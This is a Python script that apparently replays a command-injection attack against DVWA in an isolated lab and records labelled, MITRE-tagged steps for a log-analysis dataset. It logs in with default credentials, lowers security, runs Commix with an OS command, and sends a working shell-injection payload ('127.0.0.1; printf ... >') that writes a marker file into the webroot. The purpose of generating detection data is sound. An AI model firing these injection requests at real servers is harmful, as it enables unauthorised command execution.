"""Record the isolated DVWA command-injection scenario."""

from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import sys
import time
from datetime import UTC, datetime
from hashlib import sha256
from html.parser import HTMLParser
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
MARKER = "M8V2-S05-FILE-CHECK"
MARKER_NAME = "m8v2-s05-marker.txt"


class Inputs(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.values: dict[str, str] = {}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag != "input":
            return
        fields = dict(attrs)
        name = fields.get("name")
        if name:
            self.values[name] = fields.get("value") or ""


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolation() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def login(session: requests.Session, headers: dict[str, str]) -> None:
    page = session.get(f"{EDGE}/login.php", headers=headers, timeout=15)
    if page.status_code != 200 or 'name="username"' not in page.text:
        raise RuntimeError("DVWA login page did not load")
    login_fields = Inputs()
    login_fields.feed(page.text)
    response = session.post(
        f"{EDGE}/login.php",
        headers=headers,
        data={
            "username": os.environ.get("DVWA_ADMIN_USER", "admin"),
            "password": os.environ.get("DVWA_ADMIN_PASSWORD", "password"),
            "Login": "Login",
            "user_token": login_fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=True,
    )
    if response.status_code != 200 or 'name="username"' in response.text:
        raise RuntimeError("DVWA lab administrator login failed")


def setup() -> None:
    headers = {"X-Lab-Client-IP": ATTACKER_IP, "User-Agent": "M8-v2-DVWA-s05-setup"}
    session = requests.Session()
    page = session.get(f"{EDGE}/setup.php", headers=headers, timeout=15)
    if page.status_code != 200 or "Create / Reset Database" not in page.text:
        raise RuntimeError(f"DVWA setup page failed (HTTP {page.status_code})")
    parser = Inputs()
    parser.feed(page.text)
    response = session.post(
        f"{EDGE}/setup.php",
        headers=headers,
        data={
            "create_db": "Create / Reset Database",
            "user_token": parser.values.get("user_token", ""),
        },
        timeout=30,
        allow_redirects=True,
    )
    if response.status_code != 200 or "Setup successful" not in response.text:
        raise RuntimeError("DVWA database setup did not complete")
    login(session, headers)
    page = session.get(f"{EDGE}/vulnerabilities/exec/", headers=headers, timeout=15)
    if page.status_code != 200 or 'name="ip"' not in page.text:
        raise RuntimeError("DVWA command-injection module did not load")
    source = Path("/app-webroot/vulnerabilities/exec/source/low.php")
    if not source.is_file():
        raise RuntimeError("pinned DVWA vulnerable source is missing")
    Path("/replay/setup-complete.json").write_text(
        json.dumps(
            {
                "application": "DVWA",
                "source_commit": "a1978a2fed195acd093010af6395f86a281537ca",
                "database_setup": "PASS",
                "authenticated_module_check": "PASS",
                "vulnerable_source_sha256": sha256(source.read_bytes()).hexdigest(),
                "vulnerable_source_line": 14,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    print("dvwa_setup=PASS")


def attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(180000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    from pacing import install_hand_pacing

    install_hand_pacing(5005, scanner=False)

    headers = {
        "X-Lab-Client-IP": ATTACKER_IP,
        "User-Agent": "M8-v2-DVWA-s05",
    }
    session = requests.Session()
    steps: list[dict[str, object]] = []

    def marked_get(step_id: str, path: str, expected: bool) -> requests.Response:
        response = session.get(
            f"{EDGE}{path}",
            headers={**headers, "X-Lab-Step": step_id},
            timeout=15,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance" if not expected else "valid_account_access",
                "mitre": ["T1595"] if not expected else ["T1078"],
                "label_method": "header",
                "expected_in_timeline": expected,
            }
        )
        return response

    home = marked_get("site_check", "/", False)
    if home.status_code not in {200, 302}:
        raise RuntimeError(f"site check returned HTTP {home.status_code}")
    login_probe = marked_get("login_page_probe", "/login.php", False)
    if login_probe.status_code != 200 or 'name="username"' not in login_probe.text:
        raise RuntimeError("DVWA login probe did not reach the expected page")
    module_probe = marked_get("command_module_probe", "/vulnerabilities/exec/", False)
    if module_probe.status_code not in {200, 302}:
        raise RuntimeError("command module reconnaissance did not complete")

    login_fields = Inputs()
    login_fields.feed(login_probe.text)
    auth = session.post(
        f"{EDGE}/login.php",
        headers={**headers, "X-Lab-Step": "editor_login"},
        data={
            "username": os.environ.get("DVWA_ADMIN_USER", "admin"),
            "password": os.environ.get("DVWA_ADMIN_PASSWORD", "password"),
            "Login": "Login",
            "user_token": login_fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=True,
    )
    if auth.status_code != 200 or 'name="username"' in auth.text:
        raise RuntimeError("DVWA lab administrator login failed")
    steps.append(
        {
            "id": "editor_login",
            "category": "valid_account_access",
            "mitre": ["T1078"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )

    security = session.get(
        f"{EDGE}/security.php",
        headers={**headers, "X-Lab-Step": "security_page_open"},
        timeout=15,
    )
    if security.status_code != 200:
        raise RuntimeError("DVWA security settings page did not load")
    steps.append(
        {
            "id": "security_page_open",
            "category": "valid_account_access",
            "mitre": ["T1078"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )
    security_fields = Inputs()
    security_fields.feed(security.text)
    set_security = session.post(
        f"{EDGE}/security.php",
        headers={**headers, "X-Lab-Step": "security_level_set"},
        data={
            "security": "low",
            "seclev_submit": "Submit",
            "user_token": security_fields.values.get("user_token", ""),
        },
        timeout=15,
        allow_redirects=False,
    )
    if set_security.status_code not in {200, 302} or session.cookies.get("security") != "low":
        raise RuntimeError("DVWA security level was not set to the isolated low setting")
    steps.append(
        {
            "id": "security_level_set",
            "category": "valid_account_access",
            "mitre": ["T1078"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )

    cookie_header = "; ".join(f"{cookie.name}={cookie.value}" for cookie in session.cookies)
    commix_started = timestamp()
    commix = subprocess.run(
        [
            "python",
            "/opt/commix/commix.py",
            "--url",
            f"{EDGE}/vulnerabilities/exec/",
            "--data",
            "ip=127.0.0.1&Submit=Submit",
            "--cookie",
            cookie_header,
            "--headers",
            f"X-Lab-Client-IP: {ATTACKER_IP}",
            "-p",
            "ip",
            "--batch",
            "--level=1",
            "--technique=r",
            "--test-filter=;",
            "--retries=0",
            "--timeout=1",
            "--skip-static",
            "--os-cmd=id",
            "--output-dir=/tmp/m8v2-s05-commix",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=90,
        check=False,
    )
    commix_ended = timestamp()
    commix_output = re.sub(r"\x1b\[[0-9;]*m", "", commix.stdout).lower()
    injectable = "appears to be injectable" in commix_output and "is vulnerable" in commix_output
    identity_confirmed = "uid=33(www-data)" in commix_output
    if commix.returncode != 0 or not injectable or not identity_confirmed:
        raise RuntimeError("pinned Commix did not confirm the command-injection path")
    request_count = re.search(r"\btotal(?: of)?\s+(\d+)\s+http", commix_output)
    Path("/replay/commix-result.json").write_text(
        json.dumps(
            {
                "tool": "commix",
                "pinned_commit": "625c0c46e4257c457774e39bd896307397eaab03",
                "exit_code": commix.returncode,
                "request_count": int(request_count.group(1)) if request_count else None,
                "injection_point_confirmed": injectable,
                "web_service_identity_confirmed": identity_confirmed,
                "started_at": commix_started,
                "ended_at": commix_ended,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    steps.append(
        {
            "id": "commix_detection",
            "category": "command_injection",
            "mitre": ["T1190"],
            "label_method": "attacker_ip_time_window",
            "attacker_ip": ATTACKER_IP,
            "started_at": commix_started,
            "ended_at": commix_ended,
            "request": "POST /vulnerabilities/exec/ HTTP/1.1",
            "status": 200,
            "candidate_ordinal": 1,
            "expected_in_timeline": False,
        }
    )

    marker_path = f"/hackable/uploads/{MARKER_NAME}"
    write = session.post(
        f"{EDGE}/vulnerabilities/exec/",
        headers={**headers, "X-Lab-Step": "command_injection_file_write"},
        data={
            "ip": (
                "127.0.0.1; printf "
                f"{MARKER} > /var/www/html{marker_path}"
            ),
            "Submit": "Submit",
        },
        timeout=15,
        allow_redirects=False,
    )
    if write.status_code != 200:
        raise RuntimeError(f"command-injection write returned HTTP {write.status_code}")
    steps.append(
        {
            "id": "command_injection_file_write",
            "category": "command_injection",
            "mitre": ["T1059.004"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )
    verify = marked_get("marker_file_check", marker_path, True)
    if verify.status_code != 200 or verify.text.strip() != MARKER:
        raise RuntimeError(f"written marker check failed (HTTP {verify.status_code})")
    steps[-1]["category"] = "valid_account_access"
    steps[-1]["mitre"] = ["T1078"]

    records = {
        "scenario_id": "s05",
        "description": (
            "An authenticated DVWA user opens the command-injection module. Pinned Commix "
            "confirms that the input reaches an operating-system command; a marked follow-up "
            "request writes a fixed plain-text file under the webroot, and the file is read back."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "command_injection_file_write",
        "steps": steps,
        "files": [
            {
                "path": marker_path,
                "role": "attacker_file",
                "expected_in_report": True,
            }
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(
        json.dumps(
            {
                "attack_completed": True,
                "commix_confirmed": injectable,
                "tool_requests": request_count.group(1) if request_count else None,
                "file_write_verified": True,
                "steps": len(steps),
            },
            sort_keys=True,
        )
    )


def main() -> None:
    if len(sys.argv) != 2 or sys.argv[1] not in {"isolation", "setup", "attack"}:
        raise SystemExit("usage: s05.py isolation|setup|attack")
    {"isolation": isolation, "setup": setup, "attack": attack}[sys.argv[1]]()


if __name__ == "__main__":
    main()
